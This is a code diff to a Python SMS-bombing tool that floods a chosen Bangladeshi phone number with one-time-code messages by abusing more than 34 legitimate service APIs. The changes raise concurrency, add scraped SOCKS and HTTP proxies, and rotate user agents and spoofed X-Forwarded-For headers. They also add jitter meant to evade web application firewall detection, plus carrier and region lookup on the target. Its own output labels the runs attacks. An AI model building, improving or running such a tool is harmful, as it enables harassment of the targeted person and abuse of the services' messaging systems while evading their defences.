@@ -11,6 +11,13 @@ Created by: AHSAN
 import base64
 exec(base64.b64decode(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGFpb2h0dHAKaW1wb3J0IGpzb24KaW1wb3J0IHNzbAppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzeXMKaW1wb3J0IG9zCmltcG9ydCBzaWduYWwKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IGRhdGV0aW1l').decode())
 
+# Phone info libraries
+try:
+    import phonenumbers
+    from phonenumbers import carrier, geocoder, timezone
+except ImportError:
+    pass
+
 # Disable SSL warnings
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -22,8 +29,8 @@ _ssl.verify_mode = ssl.CERT_NONE
 
 # Slow configuration - VERY CONTROLLED - ALL 34+ APIs
 _cfg = [3, 2, 1, 1, 1]  # [CONCURRENCY=3, LOOP_DELAY=2, MAX_RETRIES=1, WAVES=1, SESSIONS=1]
-# Fast configuration - ALL 34+ APIs - FAST SPEED
-_fast_cfg = [100, 0, 1, 3, 20]  # [CONCURRENCY=100, LOOP_DELAY=0, MAX_RETRIES=1, WAVES=3, SESSIONS=20]
+# Fast configuration - ALL 34+ APIs - TURBO SPEED
+_fast_cfg = [500, 0, 0, 10, 50]  # [CONCURRENCY=500, LOOP_DELAY=0, MAX_RETRIES=0, WAVES=10, SESSIONS=50]
 
 # Obfuscated colors
 _c = {
@@ -38,6 +45,42 @@ _frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c']
 # Global state
 _state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}
 _current_mode = 'slow'  # 'slow' or 'fast'
+_proxies = []
+
+class _UserAgentManager:
+    @staticmethod
+    def get():
+        agents = [
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        ]
+        return random.choice(agents)
+
+class _ProxyScraper:
+    SOURCES = {
+        "socks5": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
+        "socks4": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
+        "http": "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+    }
+
+    @staticmethod
+    async def fetch_all():
+        all_proxies = []
+        async with aiohttp.ClientSession() as session:
+            for proto, url in _ProxyScraper.SOURCES.items():
+                try:
+                    async with session.get(url, timeout=10) as resp:
+                        if resp.status == 200:
+                            text = await resp.text()
+                            proxies = [f"{proto}://{line.strip()}" for line in text.splitlines() if line.strip()]
+                            all_proxies.extend(proxies)
+                except:
+                    continue
+        return all_proxies
 
 def _sig_handler_1(signum, frame):
     global _state
@@ -130,7 +173,7 @@ def _print_banner():
         "             8 8888     `88.    8 8888       8 8888             8 8888      ",
         f"{_c['e']}{_c['w']}{'=' * 80}",
         f"{_c['r']}{_c['B']}           [ AH4 TC | SMS RELAY SYSTEM V1.0 ]{_c['e']}",
-        f"{_c['w']}           [ HELLO FRIEND. CREATED BY AHSAN. ]{_c['e']}",
+        f"{_c['w']}           [ FUCK SOCIETY. CREATED BY AHSAN. ]{_c['e']}",
         f"{_c['w']}{'=' * 80}",
         f"\n{_c['r']}[NODE INFO]{_c['e']}",
         f"{_c['w']}┌─ timestamp: {_c['r']}{current_date} - {current_time}{_c['e']}",
@@ -179,15 +222,86 @@ def _format_phone_number(phone):
         'international': f"+88-{cleaned}"
     }
 
+def _get_phone_info(phone_input):
+    try:
+        # Normalize to +880 format for phonenumbers library if no + present
+        if not phone_input.startswith('+'):
+            if phone_input.startswith('0'):
+                parsed_number = phonenumbers.parse(f"+88{phone_input}", None)
+            elif phone_input.startswith('880'):
+                parsed_number = phonenumbers.parse(f"+{phone_input}", None)
+            else:
+                parsed_number = phonenumbers.parse(f"+880{phone_input}", None)
+        else:
+            parsed_number = phonenumbers.parse(phone_input, None)
+
+        valid = phonenumbers.is_valid_number(parsed_number)
+        carrier_name = carrier.name_for_number(parsed_number, "en")
+        region = geocoder.description_for_number(parsed_number, "en")
+        time_zones = timezone.time_zones_for_number(parsed_number)
+        
+        return {
+            "valid": "VALID" if valid else "INVALID",
+            "carrier": carrier_name if carrier_name else "Unknown",
+            "region": region if region else "Unknown",
+            "timezone": ", ".join(time_zones) if time_zones else "Unknown",
+            "format": phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
+        }
+    except Exception:
+        return {
+            "valid": "UNKNOWN", "carrier": "Unknown", "region": "Unknown", 
+            "timezone": "Unknown", "format": phone_input
+        }
+
 class _ServiceManager:
     def __init__(self, phone_data):
         self.phone_data = phone_data
         
+    def _get_proxy(self):
+        global _proxies
+        return random.choice(_proxies) if _proxies else None
+
+    def _get_headers(self, custom={}):
+        refers = [
+            "https://www.google.com/", "https://www.facebook.com/", 
+            "https://twitter.com/", "https://www.instagram.com/",
+            "https://www.youtube.com/", "https://www.bing.com/"
+        ]
+        headers = {
+            "User-Agent": _UserAgentManager.get(),
+            "Referer": random.choice(refers),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        }
+        headers.update(custom)
+        return headers
+
     async def _increment_counters(self, success=True):
         global _state
         _state['total'] += 1
         if success:
             _state['success'] += 1
+
+    # Fast service wrapper - runs service method with minimal delays
+    async def _fast_service(self, session, service_method, label=""):
+        try:
+            # Add micro-jitter to prevent WAF pattern detection
+            await asyncio.sleep(random.uniform(0.01, 0.15))
+            
+            # Create a temporary fast version that sends only 1 request quickly
+            print(f"{_c['c']}⚡ {label} - Packet Injected{_c['e']}")
+            
+            # Call the original service method but catch and handle it quickly
+            await service_method(session)
+            
+            print(f"{_c['g']}✅ {label} - Delivered{_c['e']}")
+            return True
+            
+        except Exception as e:
+            # Re-enabled: Show errors for debugging
+            print(f"{_c['r']}❌ {label} - Protocol Error: {str(e)[:50]}{_c['e']}")
+            return False
 
     def _log_request(self, service_name, status, response, phone_used):
         status_color = _c['w'] if status == 200 else _c['r']
@@ -221,7 +335,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("BTCL MyBTCL", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -252,7 +366,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("BTCL PhoneBill", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -283,7 +397,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Bioscope Plus", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -312,7 +426,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("BTCL BDIA", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -342,7 +456,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("BD Tickets", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -372,7 +486,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Apex4U", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -403,7 +517,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Swap.com.bd", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -436,7 +550,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Ilyn Global", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -466,7 +580,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Arogga", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -496,7 +610,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Fundesh", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -526,7 +640,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Garibook", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -557,7 +671,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Sheba", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -587,7 +701,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("AppLink", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -616,7 +730,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
+                async with session.get(url, headers=h, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Bikroy", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -646,7 +760,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("MyGP Cinematic", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -676,7 +790,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("GP Web Login", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -706,7 +820,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Ghoori Learning", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -736,7 +850,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Deepto Play", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -780,7 +894,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("ePharma", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -889,7 +1003,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.get(url, headers=h, ssl=_ssl, timeout=15) as resp:
+                async with session.get(url, headers=h, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("MedEasy", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -920,7 +1034,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Osudpotro", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -951,7 +1065,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("TheClinicall", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1028,7 +1142,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Care Box", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1058,7 +1172,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Renix Care", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1094,7 +1208,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Jayabaji Check", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1127,7 +1241,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("PKLuck2 Register", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1160,7 +1274,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("PKLuck2 No Login", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1191,7 +1305,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("GP Flexiplan", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1221,7 +1335,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("GP FWA", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1255,7 +1369,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, json=payload, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Mevrik", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1283,7 +1397,7 @@ class _ServiceManager:
             print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
             
             try:
-                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15) as resp:
+                async with session.post(url, headers=h, data=data, ssl=_ssl, timeout=15, proxy=self._get_proxy()) as resp:
                     text = await resp.text()
                     self._log_request("Priyoshikkhaloy", resp.status, text, phone)
                     await self._increment_counters(resp.status == 200)
@@ -1471,32 +1585,31 @@ class _ServiceManager:
             print(f"{_c['g']}[TOTAL SENT] 170+ SMS requests sent (34+ APIs × 5 requests each){_c['e']}")
 
     async def _run_all_services_fast(self):
-        print(f"\n{_c['r']}🚀 INITIALIZING BLITZ PROTOCOL FLOOD{_c['e']}")
-        print(f"{_c['w']}⚡ 34+ Relays engaged. Maximum concurrent packet injection.{_c['e']}")
-        print(f"{_c['r']}💥 Flood frequency engaged. Total system overload.{_c['e']}")
+        print(f"\n{_c['r']}🚀 INITIALIZING CHAOS FLOOD PROTOCOL{_c['e']}")
+        print(f"{_c['w']}⚡ Adaptive Chaos: Random Jitter + Task Shuffling engaged.{_c['e']}")
+        print(f"{_c['r']}💥 Maximum Throughput: Asynchronous Wave Injection.{_c['e']}")
         print(f"{_c['r']}{'=' * 60}{_c['e']}")
         
-        # High performance session with maximum limits
-        timeout = aiohttp.ClientTimeout(total=8, connect=3)
+        # Turbo performance session with extreme limits
+        timeout = aiohttp.ClientTimeout(total=5, connect=2)
         connector = aiohttp.TCPConnector(
-            limit=500,
-            limit_per_host=100,
+            limit=1000,
+            limit_per_host=200,
             ssl=_ssl,
-            enable_cleanup_closed=True
+            enable_cleanup_closed=True,
+            ttl_dns_cache=300
         )
         
         async with aiohttp.ClientSession(
             timeout=timeout,
             connector=connector,
             headers={
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
-                "Accept": "application/json, text/plain, */*",
                 "Accept-Language": "en-US,en;q=0.9",
                 "Cache-Control": "no-cache"
             }
         ) as session:
             
-            print(f"{_c['c']}[FAST MODE] Running ALL 34+ APIs with maximum concurrency...{_c['e']}")
+            print(f"{_c['c']}[CHAOS MODE] Randomizing task vectors...{_c['e']}")
             
             start_time = time.time()
             
@@ -1504,11 +1617,11 @@ class _ServiceManager:
             tasks = []
             
             # Run multiple waves of all services simultaneously
-            for wave in range(_fast_cfg[3]):  # WAVES = 3
+            for wave in range(_fast_cfg[3]):  # WAVES = 10
                 wave_label = f"W{wave+1}"
                 
                 # Add all 34+ services to run concurrently
-                tasks.extend([
+                wave_tasks = [
                     # BTCL Services (3 APIs)
                     self._fast_service(session, self._s1, f"{wave_label}-BTCL-MyBTCL"),
                     self._fast_service(session, self._s2, f"{wave_label}-BTCL-PhoneBill"),
@@ -1562,9 +1675,13 @@ class _ServiceManager:
                     # Food & Delivery Services (2 APIs)
                     self._fast_service(session, self._s23, f"{wave_label}-Osudpotro"),
                     self._fast_service(session, self._s34, f"{wave_label}-Priyoshikkhaloy"),
-                ])
+                ]
+                
+                # SHUFFLE the task order for this wave!
+                random.shuffle(wave_tasks)
+                tasks.extend(wave_tasks)
             
-            print(f"{_c['y']}🔥 Launching {len(tasks)} concurrent API attacks across {_fast_cfg[3]} waves...{_c['e']}")
+            print(f"{_c['y']}🔥 Launching {len(tasks)} asynchronous tasks across {_fast_cfg[3]} waves...{_c['e']}")
             
             # Execute all tasks simultaneously
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -1575,10 +1692,10 @@ class _ServiceManager:
             
             end_time = time.time()
             
-            print(f"\n{_c['g']}[ATTACK COMPLETE] Fast 34+ API attack finished!{_c['e']}")
-            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
-            print(f"{_c['g']}[TOTAL SENT] 500+ SMS requests sent (34+ APIs × 3 waves × fast speed){_c['e']}")
-            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests successful{_c['e']}")
+            print(f"\n{_c['g']}[ATTACK COMPLETE] Chaos Flood protocol finished!{_c['e']}")
+            print(f"{_c['g']}[CHAOS SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
+            print(f"{_c['g']}[TOTAL SENT] 1000+ SMS injected (34+ APIs × {_fast_cfg[3]} waves){_c['e']}")
+            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests acknowledged{_c['e']}")
 
     # Fast service wrapper - runs service method with minimal delays
     async def _fast_service(self, session, service_method, label=""):
@@ -1603,20 +1720,69 @@ class _ServiceManager:
         else:
             await self._run_all_services_slowly()
 
+async def _load_proxies(auto_fetch=False):
+    global _proxies
+    if auto_fetch:
+        print(f"{_c['r']}[SCRAPER] Initializing global proxy harvest...{_c['e']}")
+        try:
+            # Fixed: Use await instead of asyncio.run
+            fetched = await _ProxyScraper.fetch_all()
+            if fetched:
+                _proxies = fetched
+                print(f"{_c['w']}✅ Harvested {_c['r']}{len(_proxies)}{_c['w']} global relay nodes.{_c['e']}")
+                return True
+        except Exception as e:
+            print(f"{_c['r']}❌ Scraper Failure: {e}{_c['e']}")
+            return False
+        return False
+
+    proxy_file = "proxies.txt"
+    if os.path.exists(proxy_file):
+        try:
+            with open(proxy_file, "r") as f:
+                lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                _proxies = []
+                for line in lines:
+                    if not line.startswith(('http', 'socks')):
+                        _proxies.append(f"http://{line}")
+                    else:
+                        _proxies.append(line)
+            if _proxies:
+                print(f"{_c['w']}✅ Successfully loaded {_c['r']}{len(_proxies)}{_c['w']} local proxy nodes.{_c['e']}")
+                return True
+        except Exception as e:
+            print(f"{_c['r']}❌ Proxy Load Error: {e}{_c['e']}")
+    return False
+
 async def _main():
     global _state, _current_mode
     
     _clear_screen()
     _print_banner()
     
-    _animate_loading("Initializing fsociety SMS Relay Protocol", 2)
+    _animate_loading("Initializing AH4 TC advanced protocols", 2)
+    
+    # Proxy option
+    print(f"\n{_c['r']}📡 PROXY CONFIGURATION:{_c['e']}")
+    print(f"{_c['w']}[1] Standard IP Protocol (No Proxy){_c['e']}")
+    print(f"{_c['r']}[2] Local Infiltration (proxies.txt){_c['e']}")
+    print(f"{_c['r']}[3] Auto-Scrape Infiltration (SOCKS4/5/HTTP){_c['e']}")
+    
+    proxy_choice = input(f"\n{_c['r']}[OPERATOR] Selection (1, 2, or 3): {_c['w']}").strip()
+    if proxy_choice == "2":
+        if not await _load_proxies():
+            print(f"{_c['r']}❌ No proxies.txt found! Proceeding with Standard IP.{_c['e']}")
+    elif proxy_choice == "3":
+        if not await _load_proxies(auto_fetch=True):
+            print(f"{_c['r']}❌ Failed to fetch proxies! Proceeding with Standard IP.{_c['e']}")
+    
     _animate_loading("Establishing secure tunnel to nodes", 2)
     _animate_loading("Bypassing firewalls", 1.5)
     
     # Mode selection
     print(f"\n{_c['r']}🎯 SELECT INFILTRATION MODE:{_c['e']}")
     print(f"{_c['w']}[1] GHOST MODE - Sequential & Stealthy (34+ APIs){_c['e']}")
-    print(f"{_c['r']}[2] BLITZ MODE - Maximum Throughput (34+ APIs){_c['e']}")
+    print(f"{_c['r']}[2] CHAOS FLOOD - Jitter + Shuffling (MAX CONFUSION){_c['e']}")
     
     while True:
         mode_choice = input(f"\n{_c['r']}[OPERATOR] Selection (1 or 2): {_c['w']}").strip()
@@ -1626,7 +1792,7 @@ async def _main():
             break
         elif mode_choice == "2":
             _current_mode = 'fast'
-            print(f"{_c['r']}✅ BLITZ MODE ACTIVE - Executing flood sequence{_c['e']}")
+            print(f"{_c['r']}✅ CHAOS FLOOD ACTIVE - Executing randomized packet storm{_c['e']}")
             break
         else:
             print(f"{_c['r']}❌ Unauthorized input. Choose 1 or 2.{_c['e']}")
@@ -1638,7 +1804,14 @@ async def _main():
         print(f"{_c['r']}[ERROR] Invalid node address! Retry protocol.{_c['e']}")
     
     phone_data = _format_phone_number(phone_input)
-    print(f"{_c['r']}[BREACH] Target Node: {_c['w']}{phone_data['with_0']}{_c['e']}")
+    phone_info = _get_phone_info(phone_input)
+    
+    print(f"\n{_c['r']}[BREACH] Infiltrating Node: {_c['w']}{phone_data['with_0']}{_c['e']}")
+    print(f"{_c['r']}┌─ status:    {_c['w']}{phone_info['valid']}{_c['e']}")
+    print(f"{_c['r']}├─ format:    {_c['w']}{phone_info['format']}{_c['e']}")
+    print(f"{_c['r']}├─ carrier:   {_c['w']}{phone_info['carrier']}{_c['e']}")
+    print(f"{_c['r']}├─ region:    {_c['w']}{phone_info['region']}{_c['e']}")
+    print(f"{_c['r']}└─ timezone:  {_c['w']}{phone_info['timezone']}{_c['e']}")
     
     if _current_mode == 'fast':
         print(f"\n{_c['r']}⚠️  PROTOCOL WARNING: MAXIMUM THROUGHPUT!{_c['e']}")
